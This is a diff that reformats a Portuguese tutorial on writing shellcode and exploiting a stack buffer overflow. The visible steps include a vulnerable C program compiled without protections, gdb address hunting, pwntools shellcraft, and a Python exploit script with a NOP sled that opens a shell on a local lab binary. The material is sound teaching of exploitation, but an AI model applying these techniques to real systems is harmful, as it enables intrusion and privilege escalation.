@@ -6,7 +6,7 @@ Shellcode nada mais é do que um pedaço de código que usamos como payload, ou 
 
 É chamado de shellcode por normalmente envolver a abertura de uma _shell_ durante a execução, mas não é necessariamente limitado a isso. Mas o que seria uma shell?
 
-Shell é uma interface entre o usuário e os serviços de um sistema operacional. Elas podem usar uma interface gráfica do usuário (GUI), como o _Windows shell_ (que possui o Menu Iniciar, a Barra de Tarefas e diversas outras funcionalidades), ou podem usar uma interface de linha de comando (CLI), como o _bash_, o _sh_, o _zsh_, entre outros que você pode usar a partir de seu _Terminal_ ou _Prompt de Comando_. É mais comum se referir a shells de linha de comando como _shell_ do que as de interface gráfica, especialmente quando estamos falando de shellcode.
+Shell é uma interface entre o usuário e os serviços de um sistema operacional. Elas podem usar uma interface gráfica do usuário \(GUI\), como o _Windows shell_ \(que possui o Menu Iniciar, a Barra de Tarefas e diversas outras funcionalidades\), ou podem usar uma interface de linha de comando \(CLI\), como o _bash_, o _sh_, o _zsh_, entre outros que você pode usar a partir de seu _Terminal_ ou _Prompt de Comando_. É mais comum se referir a shells de linha de comando como _shell_ do que as de interface gráfica, especialmente quando estamos falando de shellcode.
 
 Esse tipo clássico de shellcode, que envolve abrir uma shell, é interessante quando há um programa rodando em uma porta de uma máquina na rede que você pode interagir ou quando esse programa possui permissões maiores que a do seu usuário atual, pois ao abrir uma shell com seu shellcode, você terá acesso à maquina com possivelmente as mesmas permissões desse tal programa. Portanto você pode conseguir acesso a uma máquina ou realizar uma escalada de privilégios.
 
@@ -25,13 +25,13 @@ int main(void) {
 
 Ele será compilado com as flags do gcc `-z execstack` e `-Wno-incompatible-pointer-types`, podendo ser adicionado o `-m32` para testar shellcodes em 32-bits.
 
-```
+```text
 gcc testador.c -o testador -z execstack -Wno-incompatible-pointer-types -m32
 ```
 
 Agora que temos o testador, vamos tentar escrever um programa simples em assembly que simula a função `exit()` em C com o parâmetro `10` e salvaremos como `exit.asm`.
 
-```asm
+```text
     section .text     ; Define que essa região do código é para as instruções
 
     global _start     ; Define que o programa começa por _start
@@ -44,7 +44,7 @@ _start:
 
 Para montarmos esse programa, usaremos o `nasm` e para linkar o objeto montado pelo nasm, usaremos o `ld`.
 
-```
+```text
 nasm -f elf32 exit.asm -o exit.o
 ld -m elf_i386 exit.o -o exit
 ```
@@ -55,8 +55,7 @@ Para pegarmos os bytes desse programa, podemos usar o objdump.
 
 Digitando `objdump -D exit`:
 
-```
-
+```text
 exit:     file format elf32-i386
 
 
@@ -70,7 +69,7 @@ Disassembly of section .text:
 
 Portanto, os bytes do programa são:
 
-```
+```text
 b8 01 00 00 00
 bb 0a 00 00 00
 cd 80
@@ -103,7 +102,7 @@ O pwntools possui uma ferramenta chamada `shellcraft` que cria um shellcode. O s
 
 Testando no interpretador python:
 
-```
+```text
 >>> from pwn import *
 >>> context.arch = 'i386'
 >>> context.bits = 32
@@ -115,7 +114,7 @@ No caso, o shellcode acima será para sistemas em 32-bits pois definimos `contex
 
 Podemos criar um para sistemas 64-bits definindo `context.arch` como `amd64` e `context.bits` como `64`:
 
-```
+```text
 >>> from pwn import *
 >>> context.arch = 'amd64'
 >>> context.bits = 64
@@ -155,23 +154,23 @@ int main(int argc, char *argv[]) {
 }
 ```
 
-Nesse caso, usaremos o `strcpy()` para não termos que nos preocupar com o caso de o shellcode ter um espaço ou um '\n' no meio e o scanf() parar de ler. Caso fossemos lidar com o `scanf()`, teriamos que fazer um shellcode que não possua esses caracteres no meio. O strcpy() para apenas no '\0', então só precisamos garantir que não há bytes nulos no shellcode.
+Nesse caso, usaremos o `strcpy()` para não termos que nos preocupar com o caso de o shellcode ter um espaço ou um '\n' no meio e o scanf\(\) parar de ler. Caso fossemos lidar com o `scanf()`, teriamos que fazer um shellcode que não possua esses caracteres no meio. O strcpy\(\) para apenas no '\0', então só precisamos garantir que não há bytes nulos no shellcode.
 
 Compilaremos esse programa da seguinte forma:
 
-```
+```text
 gcc shellcode.c -o shellcode -z execstack -fno-stack-protector -m32 -mpreferred-stack-boundary=2 -no-pie
 ```
 
 Podemos verificar se está tudo correto usando o checksec do pwntools pelo seguinte comando:
 
-```
+```text
 checksec shellcode
 ```
 
 Se aparecer a seguinte mensagem com o NX disabled, está tudo certo:
 
-```
+```text
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -182,7 +181,7 @@ Se aparecer a seguinte mensagem com o NX disabled, está tudo certo:
 
 Caso apareça essa outra mensagem com o NX enabled:
 
-```
+```text
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -192,13 +191,13 @@ Caso apareça essa outra mensagem com o NX enabled:
 
 Você precisará usar o `execstack` para removê-lo, caso contrário, não poderemos executar a stack.
 
-```
+```text
 execstack -s shellcode
 ```
 
 Abrindo no gdb, vemos que a organização da stack na main está da seguinte forma:
 
-```
+```text
 Dump of assembler code for function main:
    0x08049196 <+0>:     endbr32
    0x0804919a <+4>:     push   ebp
@@ -218,7 +217,7 @@ Podemos dar `break main` no gdb para que a stack esteja num ponto que há apenas
 
 Podemos usar o `$()` para colocar um comando no lugar do argumento e podemos usar o Python com a flag `-c` para que ele execute o que estiver entre aspas.
 
-```
+```text
 break main
 run $(python3 -c "print('A' * 64)")
 ```
@@ -229,7 +228,7 @@ Sairemos do gdb e abriremos o Python 3 para começar nosso exploit. Nosso payloa
 
 Escreveremos o seguinte script:
 
-```=python
+```text
 from pwn import *
 
 # Faz o buffer overflow
@@ -249,7 +248,7 @@ f.close()                        # Fecha o arquivo
 
 Se formos para o gdb e executarmos o programa com nosso arquivo de payload como argumento:
 
-```
+```text
 run $(cat exploit.txt)
 ```
 
@@ -259,7 +258,7 @@ Porém, uma shell no GDB não pode te dar permissões a mais e será uma execuç
 
 Se tentarmos executar no programa original:
 
-```
+```text
 ./shellcode $(cat exploit.txt)
 ```
 
@@ -271,7 +270,7 @@ NOP é uma instrução que não faz nada e em binário, ela é equivalente ao by
 
 Vamos desabilitar o ASLR e adicionar um NOP sled de 1000 bytes ao nosso exploit. Para isso, teremos que pegar o novo endereço da stack, baseado em um argumento de 64+1000 bytes. Então abrimos o GDB e executamos novamente os seguintes comandos:
 
-```
+```text
 break main
 run $(python3 -c "print('A' * 1064)")
 print $esp+0x4
@@ -279,7 +278,7 @@ print $esp+0x4
 
 Agora com o novo endereço, que nesse exemplo é 0xffffcf90, modificamos nosso script em Python para o novo endereço e colocamos um NOP sled de 1000 bytes logo antes do shellcode. Também usaremos o endereço que pegamos somado com aproximadamente metade do NOP sled, para caso o começo do NOP sled no GDB esteja antes do começo do NOP sled na stack real. Caso não esteja, ainda é muito provável que mesmo somando metade, ainda acertaremos o NOP sled.
 
-```=python
+```text
 #!/usr/bin/env python3
 
 from pwn import *
@@ -302,8 +301,9 @@ f.close()                        # Fecha o arquivo
 
 Testando no programa original:
 
-```
+```text
 ./shellcode $(cat exploit.txt)
 ```
 
-Provavelmente você conseguiu uma shell. Se testar no GDB, ele deve funcionar também. Caso não tenha conseguido, tente aumentar o tamanho do NOP sled e/ou mudar o offset em relação ao endereço original, que nesse caso foi usado 0x200 (aproximadamente metade do NOP sled).
+Provavelmente você conseguiu uma shell. Se testar no GDB, ele deve funcionar também. Caso não tenha conseguido, tente aumentar o tamanho do NOP sled e/ou mudar o offset em relação ao endereço original, que nesse caso foi usado 0x200 \(aproximadamente metade do NOP sled\).
+
